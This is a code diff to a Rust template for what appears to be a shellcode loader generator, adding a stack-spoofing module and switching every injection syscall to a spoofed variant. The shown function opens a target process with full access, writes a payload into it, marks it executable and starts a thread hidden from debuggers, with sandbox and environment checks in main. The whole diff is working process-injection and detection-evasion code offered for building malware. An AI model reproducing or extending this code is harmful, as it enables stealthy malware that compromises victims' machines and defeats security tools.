@@ -3,6 +3,7 @@
 
 {{LITCRYPT_SETUP}}
 {{COMMON_MODULE}}
+{{STACK_SPOOF_MODULE}}
 
 use sysinfo::System;
 use std::include_bytes;
@@ -67,21 +68,21 @@ fn inject_shellcode(mut buf: Vec<u8>, tar: usize) {
     };
 
     unsafe {
-        let s = syscall!("NtOpenProcess", &mut process_handle, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
+        let s = spoofed_syscall!("NtOpenProcess", &mut process_handle, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
         if !NT_SUCCESS(s) { return; }
 
         pause(150);
 
         let mut base: *mut c_void = null_mut();
         let mut size: usize = buf.len();
-        let s = syscall!("NtAllocateVirtualMemory", process_handle, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        let s = spoofed_syscall!("NtAllocateVirtualMemory", process_handle, &mut base, 0_usize, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if !NT_SUCCESS(s) { return; }
 
         pause(200);
 
         let buf_len = buf.len();
         let mut written: usize = 0;
-        let s = syscall!("NtWriteVirtualMemory", process_handle, base, buf.as_mut_ptr() as *mut c_void, buf_len, &mut written);
+        let s = spoofed_syscall!("NtWriteVirtualMemory", process_handle, base, buf.as_mut_ptr() as *mut c_void, buf_len, &mut written);
         if !NT_SUCCESS(s) { return; }
 
         common::wipe(&mut buf);
@@ -89,18 +90,20 @@ fn inject_shellcode(mut buf: Vec<u8>, tar: usize) {
 
         let mut old_perms = PAGE_READWRITE;
         let mut psize = buf_len;
-        let s = syscall!("NtProtectVirtualMemory", process_handle, &mut base, &mut psize, PAGE_EXECUTE_READ, &mut old_perms);
+        let s = spoofed_syscall!("NtProtectVirtualMemory", process_handle, &mut base, &mut psize, PAGE_EXECUTE_READ, &mut old_perms);
         if !NT_SUCCESS(s) { return; }
 
         pause(100);
 
         let mut thread_handle: *mut c_void = null_mut();
-        let _s = syscall!("NtCreateThreadEx", &mut thread_handle, THREAD_ALL_ACCESS, NULL, process_handle, base, NULL, THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, 0_usize, 0_usize, 0_usize, NULL);
+        let _s = spoofed_syscall!("NtCreateThreadEx", &mut thread_handle, THREAD_ALL_ACCESS, NULL, process_handle, base, NULL, THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, 0_usize, 0_usize, 0_usize, NULL);
     }
 }
 
 fn main() {
     {{SANDBOX}}
+
+    {{STACK_SPOOF_INIT}}
 
     if !check_environment() { return; }
 
